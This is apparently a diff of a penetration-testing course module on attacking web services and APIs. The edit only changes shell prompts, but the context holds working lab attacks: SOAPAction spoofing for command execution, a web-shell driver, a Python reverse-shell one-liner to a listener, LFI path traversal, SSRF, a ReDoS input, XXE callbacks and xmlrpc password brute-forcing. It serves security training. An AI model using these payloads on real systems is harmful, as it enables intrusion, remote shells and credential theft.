@@ -213,7 +213,7 @@ Let us start by performing basic directory fuzzing against the web service.
 &#x20; Web Services Description Language (WSDL)
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ dirb http://<TARGET IP>:3002
+root@htb[/htb]$ dirb http://<TARGET IP>:3002
 
 -----------------
 DIRB v2.22    
@@ -241,7 +241,7 @@ It looks like `http://<TARGET IP>:3002/wsdl` exists. Let us inspect its content 
 &#x20; Web Services Description Language (WSDL)
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl http://<TARGET IP>:3002/wsdl 
+root@htb[/htb]$ curl http://<TARGET IP>:3002/wsdl 
 ```
 
 The response is empty! Maybe there is a parameter that will provide us with access to the SOAP web service's WSDL file. Let us perform parameter fuzzing using _ffuf_ and the [burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt) list, as follows. _-fs 0_ filters out empty responses (size = 0) and _-mc 200_ matches _HTTP 200_ responses.
@@ -249,7 +249,7 @@ The response is empty! Maybe there is a parameter that will provide us with acce
 &#x20; Web Services Description Language (WSDL)
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3002/wsdl?FUZZ' -fs 0 -mc 200
+root@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3002/wsdl?FUZZ' -fs 0 -mc 200
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -288,7 +288,7 @@ It looks like _wsdl_ is a valid parameter. Let us now issue a request for `http:
 &#x20; Web Services Description Language (WSDL)
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl http://<TARGET IP>:3002/wsdl?wsdl 
+root@htb[/htb]$ curl http://<TARGET IP>:3002/wsdl?wsdl 
 
 <?xml version="1.0" encoding="UTF-8"?>
 <wsdl:definitions targetNamespace="http://tempuri.org/"
@@ -569,7 +569,7 @@ Suppose we are assessing a SOAP web service, whose WSDL file resides in `http://
 The service's WSDL file can be found below.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl http://<TARGET IP>:3002/wsdl?wsdl 
+root@htb[/htb]$ curl http://<TARGET IP>:3002/wsdl?wsdl 
 
 <?xml version="1.0" encoding="UTF-8"?>
 <wsdl:definitions targetNamespace="http://tempuri.org/" 
@@ -793,7 +793,7 @@ print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAP
 The Python script can be executed, as follows.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 client.py
+root@htb[/htb]$ python3 client.py
 b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandResponse xmlns="http://tempuri.org/"><success>false</success><error>This function is only allowed in internal networks</error></ExecuteCommandResponse></soap:Body></soap:Envelope>'
 ```
 
@@ -818,7 +818,7 @@ If the web service determines the operation to be executed based solely on the S
 Let us execute the new script.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 client_soapaction_spoofing.py
+root@htb[/htb]$ python3 client_soapaction_spoofing.py
 b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginResponse xmlns="http://tempuri.org/"><success>true</success><result>root\n</result></LoginResponse></soap:Body></soap:Envelope>'
 ```
 
@@ -838,7 +838,7 @@ while True:
 You can execute it as follows.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 automate.py
+root@htb[/htb]$ python3 automate.py
 $ id
 b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginResponse xmlns="http://tempuri.org/"><success>true</success><result>uid=0(root) gid=0(root) groups=0(root)\n</result></LoginResponse></soap:Body></soap:Envelope>'
 $ 
@@ -884,7 +884,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
   *   &#x20;&#x20;
 
       ```shell-session
-      AbdulrahmanTamim@htb[/htb]$ sudo tcpdump -i tun0 icmp
+      root@htb[/htb]$ sudo tcpdump -i tun0 icmp
        tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
        listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
        11:10:22.521853 IP 10.129.202.133 > 10.10.14.222: ICMP echo request, id 1, seq 1, length 64
@@ -902,7 +902,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
 You can test the command injection vulnerability as follows.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl http://<TARGET IP>:3003/ping-server.php/system/ls
+root@htb[/htb]$ curl http://<TARGET IP>:3003/ping-server.php/system/ls
 index.php
 ping-server.php
 ```
@@ -922,7 +922,7 @@ Suppose we are assessing the security of a WordPress instance residing in _http:
 We can mount a password brute-forcing attack through `xmlrpc.php`, as follows.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
+root@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
 
 <?xml version="1.0" encoding="UTF-8"?>
 <methodResponse>
@@ -949,7 +949,7 @@ Above, you can see a successful login attempt through `xmlrpc.php`.
 We will receive a `403 faultCode` error if the credentials are not valid.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>WRONG-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
+root@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>WRONG-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
 
 <?xml version="1.0" encoding="UTF-8"?>
 <methodResponse>
@@ -973,7 +973,7 @@ AbdulrahmanTamim@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsers
 You may ask how we identified the correct method to call (_system.listMethods_). We did that by going through the well-documented [Wordpress code](https://codex.wordpress.org/XML-RPC/system.listMethods) and interacting with `xmlrpc.php`, as follows.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
+root@htb[/htb]$ curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
 
 <?xml version="1.0" encoding="UTF-8"?>
 <methodResponse>
@@ -1124,7 +1124,7 @@ Suppose we are assessing an API residing in `http://<TARGET IP>:3003`.
 Maybe there is a parameter that will reveal the API's functionality. Let us perform parameter fuzzing using _ffuf_ and the [burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt) list, as follows.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value'
+root@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value'
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -1170,7 +1170,7 @@ We notice a similar response size in every request. This is because supplying an
 Let us filter out any responses having a size of 19, as follows.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value' -fs 19
+root@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value' -fs 19
 
  
         /'___\  /'___\           /'___\       
@@ -1216,7 +1216,7 @@ ________________________________________________
 It looks like _id_ is a valid parameter. Let us check the response when specifying _id_ as a parameter and a test value.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl http://<TARGET IP>:3003/?id=1
+root@htb[/htb]$ curl http://<TARGET IP>:3003/?id=1
 [{"id":"1","username":"admin","position":"1"}]
 ```
 
@@ -1249,7 +1249,7 @@ brute()
 The above script can be run, as follows.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 brute_api.py http://<TARGET IP>:3003
+root@htb[/htb]$ python3 brute_api.py http://<TARGET IP>:3003
 Number found! 1
 [{"id":"1","username":"admin","position":"1"}]
 Number found! 2
@@ -1345,7 +1345,7 @@ if args.target and args.option == "yes": # if the target option is set and args.
 Use the script as follows.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes
+root@htb[/htb]$ python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes
 $ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
@@ -1353,7 +1353,7 @@ uid=0(root) gid=0(root) groups=0(root)
 To obtain a more functional (reverse) shell, execute the below inside the shell gained through the Python script above. Ensure that an active listener (such as Netcat) is in place before executing the below.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes
+root@htb[/htb]$ python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes
 $ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<VPN/TUN Adapter IP>",<LISTENER PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```
 
@@ -1374,14 +1374,14 @@ Suppose we are assessing such an API residing in `http://<TARGET IP>:3000/api`.
 Let us first interact with it.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl http://<TARGET IP>:3000/api
+root@htb[/htb]$ curl http://<TARGET IP>:3000/api
 {"status":"UP"}
 ```
 
 We don't see anything helpful except the indication that the API is up and running. Let us perform API endpoint fuzzing using _ffuf_ and the [common-api-endpoints-mazen160.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common-api-endpoints-mazen160.txt) list, as follows.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'
+root@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -1413,14 +1413,14 @@ Progress: [174/174] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 
 It looks like `/api/download` is a valid API endpoint. Let us interact with it
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl http://<TARGET IP>:3000/api/download
+root@htb[/htb]$ curl http://<TARGET IP>:3000/api/download
 {"success":false,"error":"Input the filename via /download/<filename>"}
 ```
 
 We need to specify a file, but we do not have any knowledge of stored files or their naming scheme. We can try mounting a Local File Inclusion (LFI) attack, though.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
+root@htb[/htb]$ curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
 127.0.0.1 localhost
 127.0.1.1 nix01-websvc
 
@@ -1502,21 +1502,21 @@ Let us first interact with it.
 &#x20; Server-Side Request Forgery (SSRF)
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl http://<TARGET IP>:3000/api/userinfo
+root@htb[/htb]$ curl http://<TARGET IP>:3000/api/userinfo
 {"success":false,"error":"'id' parameter is not given."}
 ```
 
 The API is expecting a parameter called _id_. Since we are interested in identifying SSRF vulnerabilities in this section, let us set up a Netcat listener first
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -nlvp 4444
+root@htb[/htb]$ nc -nlvp 4444
 listening on [any] 4444 ...
 ```
 
 Then, let us specify `http://<VPN/TUN Adapter IP>:<LISTENER PORT>` as the value of the _id_ parameter and make an API call.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl "http://<TARGET IP>:3000/api/userinfo?id=http://<VPN/TUN Adapter IP>:<LISTENER PORT>"
+root@htb[/htb]$ curl "http://<TARGET IP>:3000/api/userinfo?id=http://<VPN/TUN Adapter IP>:<LISTENER PORT>"
 {"success":false,"error":"'id' parameter is invalid."}
 ```
 
@@ -1525,14 +1525,14 @@ We notice an error about the _id_ parameter being invalid, and we also notice no
 In many cases, APIs expect parameter values in a specific format/encoding. Let us try Base64-encoding `http://<VPN/TUN Adapter IP>:<LISTENER PORT>` and making an API call again.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo "http://<VPN/TUN Adapter IP>:<LISTENER PORT>" | tr -d '\n' | base64
-AbdulrahmanTamim@htb[/htb]$ curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"
+root@htb[/htb]$ echo "http://<VPN/TUN Adapter IP>:<LISTENER PORT>" | tr -d '\n' | base64
+root@htb[/htb]$ curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"
 ```
 
 When you make the API call, you will notice a connection being made to your Netcat listener. The API is vulnerable to SSRF.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -nlvp 4444
+root@htb[/htb]$ nc -nlvp 4444
 listening on [any] 4444 ...
 connect to [<VPN/TUN Adapter IP>] from (UNKNOWN) [<TARGET IP>] 50542
 GET / HTTP/1.1
@@ -1561,7 +1561,7 @@ The API resides in `http://<TARGET IP>:3000/api/check-email` and accepts a param
 Let's interact with it as follows.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl "http://<TARGET IP>:3000/api/check-email?email=test_value"
+root@htb[/htb]$ curl "http://<TARGET IP>:3000/api/check-email?email=test_value"
 {"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}
 ```
 
@@ -1574,7 +1574,7 @@ The second and third groups are doing bad iterative checks.
 Let's submit the following valid value and see how long the API takes to respond.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl "http://<TARGET IP>:3000/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555."
+root@htb[/htb]$ curl "http://<TARGET IP>:3000/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555."
 {"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}
 ```
 
@@ -1603,7 +1603,7 @@ By the time we browse `http://<TARGET IP>:3001`, we come across an authenticatio
 Run Burp Suite as follows.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ burpsuite
+root@htb[/htb]$ burpsuite
 ```
 
 Activate burp suite's proxy (_Intercept On_) and configure your browser to go through it.
@@ -1661,28 +1661,28 @@ We have called our external entity _somename_, and it will use the SYSTEM keywor
 Let us set up a Netcat listener as follows.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -nlvp 4444
+root@htb[/htb]$ nc -nlvp 4444
 listening on [any] 4444 ...
 ```
 
 Now let us make an API call containing the payload we crafted above.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>test@test.com</email><password>P@ssw0rd123</password></root>'
+root@htb[/htb]$ curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>test@test.com</email><password>P@ssw0rd123</password></root>'
 <p>Sorry, we cannot find a account with <b></b> email.</p>
 ```
 
 We notice no connection being made to our listener. This is because we have defined our external entity, but we haven't tried to use it. We can do that as follows.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'
+root@htb[/htb]$ curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'
 
 ```
 
 After the call to the API, you will notice a connection being made to the listener.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -nlvp 4444
+root@htb[/htb]$ nc -nlvp 4444
 listening on [any] 4444 ...
 connect to [<VPN/TUN Adapter IP>] from (UNKNOWN) [<TARGET IP>] 54984
 GET / HTTP/1.0
